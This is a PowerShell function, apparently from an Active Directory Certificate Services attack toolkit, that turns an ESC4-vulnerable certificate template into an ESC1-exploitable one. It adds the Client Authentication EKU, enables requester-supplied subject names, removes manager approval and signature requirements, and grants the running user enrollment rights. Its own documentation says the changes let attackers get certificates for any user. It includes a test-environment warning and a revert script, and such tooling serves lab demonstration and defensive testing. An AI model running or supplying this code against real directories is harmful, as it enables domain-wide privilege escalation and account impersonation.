function ConvertTo-ESC1 {
    <#
        .SYNOPSIS
        Converts an ESC4 vulnerability to an ESC1 vulnerability by modifying certificate template attributes.

        .DESCRIPTION
        This function takes an ESC4 ESCalatorIssue object and attempts to convert it to an ESC1 vulnerability
        by making the following changes to the associated certificate template:
        1. Add the "Client Authentication" EKU (1.3.6.1.5.5.7.3.2) to pKIExtendedKeyUsage
        2. Enable the SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1) in msPKI-Certificate-Name-Flag
        3. Remove the Pend flag (CT_FLAG_PEND_ALL_REQUESTS = 0x2) from msPKI-Enrollment-Flag
        4. Set the msPKI-RA-Signature value to 0 (disable required signatures)
        5. Grant the current user Enroll rights on the template

        These changes make the template vulnerable to ESC1 attacks where attackers can specify
        arbitrary Subject Alternative Names and obtain certificates for any user/computer.
        
        Additionally, the function grants the current user Enroll rights on the template to
        ensure the attack can be executed successfully.

        .PARAMETER InputObject
        Either an ESCalatorIssue object representing an ESC4 vulnerability, or a DirectoryEntry object
        representing a certificate template (pKICertificateTemplate). When using ESCalatorIssue objects,
        they must have a DirectoryEntry property pointing to a certificate template object.

        .PARAMETER RevertScriptPath
        Optional path where the revert script will be generated. If not specified, creates a script
        in the current directory named "Revert-ESC1-{TemplateName}-{Timestamp}.ps1".

        .PARAMETER PassThru
        Returns the modified DirectoryEntry object representing the certificate template instead of 
        the default result object. Useful for chaining operations in a pipeline.

        .PARAMETER WhatIf
        Shows what changes would be made without actually performing them.

        .INPUTS
        ESCalatorIssue, System.DirectoryServices.DirectoryEntry
        ESC4 ESCalatorIssue objects with certificate template DirectoryEntry objects, or DirectoryEntry objects representing certificate templates.

        .OUTPUTS
        PSCustomObject, System.DirectoryServices.DirectoryEntry
        By default, returns a result object indicating success/failure and what changes were made.
        When -PassThru is specified, returns the modified DirectoryEntry object representing the certificate template.

        .EXAMPLE
        $ESC4Issues = Find-ESC4Issue -AdcsObjects $AdcsObjects
        $ESC4Issues | Where-Object { $_.Subtype -like '*Template*' } | ConvertTo-ESC1

        .EXAMPLE
        $ESC4Issue = Find-ESC4Issue -AdcsObjects $AdcsObjects | Select-Object -First 1
        ConvertTo-ESC1 -InputObject $ESC4Issue -WhatIf

        .EXAMPLE
        $Templates = Get-AdcsObjects | Where-Object { $_.ObjectClass -eq 'pKICertificateTemplate' }
        $DemoTemplate = $Templates | Where-Object { $_.Properties['name'].Value -eq 'Demo1' }
        ConvertTo-ESC1 -InputObject $DemoTemplate

        .EXAMPLE
        $ESC4Issues = Find-ESC4Issue -AdcsObjects $AdcsObjects
        $ESC4Issues | Where-Object { $_.Subtype -like '*Template*' } | ConvertTo-ESC1 -RevertScriptPath "C:\Temp\Revert-ESC1.ps1"

        .EXAMPLE
        # Use PassThru to get the modified template object for further processing
        $ESC4Issue = Find-ESC4Issue -AdcsObjects $AdcsObjects | Select-Object -First 1
        $ModifiedTemplate = $ESC4Issue | ConvertTo-ESC1 -PassThru
        # Now you can use $ModifiedTemplate for additional operations

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2

        .NOTES
        WARNING: This function makes destructive changes to certificate templates that create
        serious security vulnerabilities. Only use in controlled test environments.
        
        Requires appropriate permissions to modify certificate template objects in Active Directory.
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        $InputObject,
        
        [Parameter()]
        [string]$RevertScriptPath,
        
        [Parameter()]
        [switch]$PassThru
    )

    #requires -Version 5

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Define constants for certificate template flags
        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1
        $CT_FLAG_PEND_ALL_REQUESTS = 0x2
        
        # Client Authentication EKU OID
        $CLIENT_AUTH_EKU = "1.3.6.1.5.5.7.3.2"
    }

    process {
        # Determine input type and extract template DirectoryEntry
        $template = $null
        $templateName = ""
        
        if ($InputObject.PSObject.TypeNames[0] -eq 'ESCalatorIssue') {
            # Handle ESCalatorIssue input
            Write-Verbose "Processing ESCalatorIssue for template: $($InputObject.Name)"
            
            # Validate that this is an ESC4 issue
            if ($InputObject.Technique -ne 'ESC4') {
                Write-Warning "Issue is not an ESC4 vulnerability (Technique: $($InputObject.Technique))"
                return [PSCustomObject]@{
                    Success = $false
                    Template = $InputObject.Name
                    Error = "Not an ESC4 issue"
                    Changes = @()
                    RevertScriptPath = $null
                }
            }
            
            # Validate that we have a DirectoryEntry for the template
            if (-not $InputObject.DirectoryEntry -or $InputObject.DirectoryEntry.SchemaClassName -ne 'pKICertificateTemplate') {
                Write-Warning "ESCalatorIssue does not contain a valid certificate template DirectoryEntry"
                return [PSCustomObject]@{
                    Success = $false
                    Template = $InputObject.Name
                    Error = "No valid certificate template DirectoryEntry found"
                    Changes = @()
                    RevertScriptPath = $null
                }
            }
            
            $template = $InputObject.DirectoryEntry
            $templateName = $InputObject.Name
            
        } elseif ($InputObject -is [System.DirectoryServices.DirectoryEntry]) {
            # Handle DirectoryEntry input
            Write-Verbose "Processing DirectoryEntry object for template conversion"
            
            # Validate that this is a certificate template
            if ($InputObject.SchemaClassName -ne 'pKICertificateTemplate') {
                Write-Warning "DirectoryEntry is not a certificate template (SchemaClassName: $($InputObject.SchemaClassName))"
                return [PSCustomObject]@{
                    Success = $false
                    Template = $InputObject.Properties['name'].Value
                    Error = "Not a certificate template DirectoryEntry"
                    Changes = @()
                    RevertScriptPath = $null
                }
            }
            
            $template = $InputObject
            $templateName = $template.Properties['name'].Value
            Write-Verbose "Processing certificate template: $templateName"
            
        } else {
            # Invalid input type
            Write-Warning "InputObject must be either an ESCalatorIssue or a DirectoryEntry object"
            return [PSCustomObject]@{
                Success = $false
                Template = "Unknown"
                Error = "Invalid input object type: $($InputObject.GetType().Name)"
                Changes = @()
                RevertScriptPath = $null
            }
        }
        
        $changes = @()
        $revertCommands = @()
        
        # Generate revert script path if not provided
        if (-not $RevertScriptPath) {
            $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
            $safeTemplateName = $templateName -replace '[^\w\-]', '_'
            $RevertScriptPath = "Revert-ESC1-$safeTemplateName-$timestamp.ps1"
        }
        
        try {
            # Refresh the DirectoryEntry to get current values
            $template.RefreshCache()
            
            Write-Verbose "Current template attributes:"
            Write-Verbose "  pKIExtendedKeyUsage: $($template.Properties['pKIExtendedKeyUsage'].Value -join ', ')"
            Write-Verbose "  msPKI-Certificate-Name-Flag: $($template.Properties['msPKI-Certificate-Name-Flag'].Value)"
            Write-Verbose "  msPKI-Enrollment-Flag: $($template.Properties['msPKI-Enrollment-Flag'].Value)"
            Write-Verbose "  msPKI-RA-Signature: $($template.Properties['msPKI-RA-Signature'].Value)"
            
            # 1. Add Client Authentication EKU to pKIExtendedKeyUsage
            $currentEKUs = @($template.Properties['pKIExtendedKeyUsage'].Value)
            if ($CLIENT_AUTH_EKU -notin $currentEKUs) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Add Client Authentication EKU to pKIExtendedKeyUsage")) {
                    $newEKUs = $currentEKUs + $CLIENT_AUTH_EKU
                    $template.Properties['pKIExtendedKeyUsage'].Clear()
                    foreach ($eku in $newEKUs) {
                        $template.Properties['pKIExtendedKeyUsage'].Add($eku)
                    }
                    $changes += "Added Client Authentication EKU ($CLIENT_AUTH_EKU)"
                    
                    # Generate revert command for EKU
                    $revertEKUs = $currentEKUs -join "', '"
                    $revertCommands += "`$template.Properties['pKIExtendedKeyUsage'].Clear()"
                    if ($currentEKUs.Count -gt 0) {
                        $revertCommands += "foreach (`$eku in @('$revertEKUs')) { `$template.Properties['pKIExtendedKeyUsage'].Add(`$eku) }"
                    }
                    
                    Write-Verbose "Added Client Authentication EKU to template"
                }
            } else {
                Write-Verbose "Client Authentication EKU already present"
            }
            
            # 2. Enable SAN flag in msPKI-Certificate-Name-Flag
            $currentNameFlag = [int]$template.Properties['msPKI-Certificate-Name-Flag'].Value
            $newNameFlag = $currentNameFlag -bor $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
            
            if ($newNameFlag -ne $currentNameFlag) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Enable SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) in msPKI-Certificate-Name-Flag")) {
                    $template.Properties['msPKI-Certificate-Name-Flag'].Value = $newNameFlag
                    $changes += "Enabled SAN flag in msPKI-Certificate-Name-Flag (0x$($currentNameFlag.ToString('X')) -> 0x$($newNameFlag.ToString('X')))"
                    
                    # Generate revert command for SAN flag
                    $revertCommands += "`$template.Properties['msPKI-Certificate-Name-Flag'].Value = $currentNameFlag"
                    
                    Write-Verbose "Enabled SAN flag in msPKI-Certificate-Name-Flag"
                }
            } else {
                Write-Verbose "SAN flag already enabled in msPKI-Certificate-Name-Flag"
            }
            
            # 3. Remove Pend flag from msPKI-Enrollment-Flag
            $currentEnrollFlag = [int]$template.Properties['msPKI-Enrollment-Flag'].Value
            $newEnrollFlag = $currentEnrollFlag -band (-bnot $CT_FLAG_PEND_ALL_REQUESTS)
            
            if ($newEnrollFlag -ne $currentEnrollFlag) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Remove Pend flag (CT_FLAG_PEND_ALL_REQUESTS) from msPKI-Enrollment-Flag")) {
                    $template.Properties['msPKI-Enrollment-Flag'].Value = $newEnrollFlag
                    $changes += "Removed Pend flag from msPKI-Enrollment-Flag (0x$($currentEnrollFlag.ToString('X')) -> 0x$($newEnrollFlag.ToString('X')))"
                    
                    # Generate revert command for enrollment flag
                    $revertCommands += "`$template.Properties['msPKI-Enrollment-Flag'].Value = $currentEnrollFlag"
                    
                    Write-Verbose "Removed Pend flag from msPKI-Enrollment-Flag"
                }
            } else {
                Write-Verbose "Pend flag not set in msPKI-Enrollment-Flag"
            }
            
            # 4. Set msPKI-RA-Signature to 0
            $currentRASignature = [int]$template.Properties['msPKI-RA-Signature'].Value
            if ($currentRASignature -ne 0) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Set msPKI-RA-Signature to 0 (disable required signatures)")) {
                    $template.Properties['msPKI-RA-Signature'].Value = 0
                    $changes += "Set msPKI-RA-Signature to 0 (was $currentRASignature)"
                    
                    # Generate revert command for RA signature
                    $revertCommands += "`$template.Properties['msPKI-RA-Signature'].Value = $currentRASignature"
                    
                    Write-Verbose "Set msPKI-RA-Signature to 0"
                }
            } else {
                Write-Verbose "msPKI-RA-Signature already set to 0"
            }
            
            # 5. Grant current user Enroll rights on the template
            try {
                # Get current user's security identifier
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $currentUserSid = $currentUser.User.Value
                Write-Verbose "Current user SID: $currentUserSid"
                
                # Get the template's security descriptor
                $templateSecurity = $template.ObjectSecurity
                
                # Define the Enroll right (0x0001) and AutoEnroll right (0x0002)
                $enrollRight = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
                $accessType = [System.Security.AccessControl.AccessControlType]::Allow
                
                # Create access rule for Enroll right
                # The GUID for Certificate-Enrollment extended right is 0e10c968-78fb-11d2-90d4-00c04f79dc55
                $enrollGuid = [System.Guid]::new("0e10c968-78fb-11d2-90d4-00c04f79dc55")
                $enrollRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $currentUser.User, $enrollRight, $accessType, $enrollGuid
                )
                
                # Check if the user already has Enroll rights
                $hasEnrollRights = $false
                foreach ($rule in $templateSecurity.Access) {
                    if ($rule.IdentityReference.Value -eq $currentUserSid -and 
                        $rule.ActiveDirectoryRights -band $enrollRight -and
                        $rule.ObjectType -eq $enrollGuid -and
                        $rule.AccessControlType -eq $accessType) {
                        $hasEnrollRights = $true
                        break
                    }
                }
                
                if (-not $hasEnrollRights) {
                    if ($PSCmdlet.ShouldProcess($template.Name, "Grant current user ($currentUserSid) Enroll rights")) {
                        # Add the access rule
                        $templateSecurity.AddAccessRule($enrollRule)
                        $template.ObjectSecurity = $templateSecurity
                        
                        $changes += "Granted current user ($($currentUser.Name)) Enroll rights on template"
                        Write-Verbose "Granted current user Enroll rights on template"
                        
                        # Generate revert command for Enroll rights
                        $revertCommands += "# Remove Enroll rights for user $($currentUser.Name) ($currentUserSid)"
                        $revertCommands += "`$userSid = [System.Security.Principal.SecurityIdentifier]::new('$currentUserSid')"
                        $revertCommands += "`$enrollGuid = [System.Guid]::new('0e10c968-78fb-11d2-90d4-00c04f79dc55')"
                        $revertCommands += "`$templateSecurity = `$template.ObjectSecurity"
                        $revertCommands += "`$rulesToRemove = `$templateSecurity.Access | Where-Object { `$_.IdentityReference.Value -eq '$currentUserSid' -and `$_.ObjectType -eq `$enrollGuid }"
                        $revertCommands += "foreach (`$rule in `$rulesToRemove) { `$templateSecurity.RemoveAccessRule(`$rule) }"
                        $revertCommands += "`$template.ObjectSecurity = `$templateSecurity"
                    }
                } else {
                    Write-Verbose "Current user already has Enroll rights on template"
                }
                
            } catch {
                Write-Warning "Failed to grant Enroll rights to current user: $($_.Exception.Message)"
                # Don't fail the entire operation for this
            }
            
            # Commit changes to Active Directory
            if ($changes.Count -gt 0 -and -not $WhatIfPreference) {
                Write-Verbose "Committing $($changes.Count) changes to Active Directory..."
                $template.CommitChanges()
                Write-Verbose "Successfully committed changes to template: $($template.Name)"
            }
            
            # Generate revert script if changes were made or in WhatIf mode
            if ($revertCommands.Count -gt 0) {
                $revertScriptContent = @"
# Revert script for ESC1 conversion changes
# Generated on: $(Get-Date)
# Template: $templateName
# Template DN: $($template.Properties['distinguishedName'].Value)

# Import required classes
Add-Type -AssemblyName 'System.DirectoryServices'

Write-Host "Reverting ESC1 changes for template: $templateName" -ForegroundColor Yellow

try {
    # Connect to the template
    `$templateDN = "$($template.Properties['distinguishedName'].Value)"
    `$template = [System.DirectoryServices.DirectoryEntry]::new("LDAP://`$templateDN")
    `$template.RefreshCache()
    
    Write-Host "Current template found, reverting changes..." -ForegroundColor Green
    
    # Revert changes (in reverse order)
$($revertCommands[-1..-($revertCommands.Count)] | ForEach-Object { "    $_" } | Out-String)
    
    # Commit the revert changes
    `$template.CommitChanges()
    Write-Host "Successfully reverted template $templateName to original state" -ForegroundColor Green
    
} catch {
    Write-Error "Failed to revert template: `$(`$_.Exception.Message)"
    exit 1
}
"@
                
                if (-not $WhatIfPreference) {
                    try {
                        $revertScriptContent | Out-File -FilePath $RevertScriptPath -Encoding UTF8
                        Write-Verbose "Revert script generated: $RevertScriptPath"
                    } catch {
                        Write-Warning "Failed to create revert script: $($_.Exception.Message)"
                    }
                } else {
                    Write-Host "Would generate revert script at: $RevertScriptPath" -ForegroundColor Cyan
                }
            }
            
            # Return result
            if ($PassThru) {
                # Refresh the DirectoryEntry to get updated properties
                $template.RefreshCache()
                return $template
            } else {
                return [PSCustomObject]@{
                    Success = $true
                    Template = $templateName
                    DistinguishedName = $template.Properties['distinguishedName'].Value
                    Changes = $changes
                    RevertScriptPath = if ($revertCommands.Count -gt 0) { $RevertScriptPath } else { $null }
                    Error = $null
                }
            }
            
        } catch {
            $errorMsg = "Failed to modify template $($template.Name): $($_.Exception.Message)"
            Write-Warning $errorMsg
            
            # Note: For error cases, we always return the error object regardless of PassThru
            # since we cannot return a valid DirectoryEntry when the operation fails
            return [PSCustomObject]@{
                Success = $false
                Template = $templateName
                Error = $errorMsg
                Changes = $changes
                RevertScriptPath = if ($revertCommands.Count -gt 0) { $RevertScriptPath } else { $null }
            }
        }
    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
    }
}
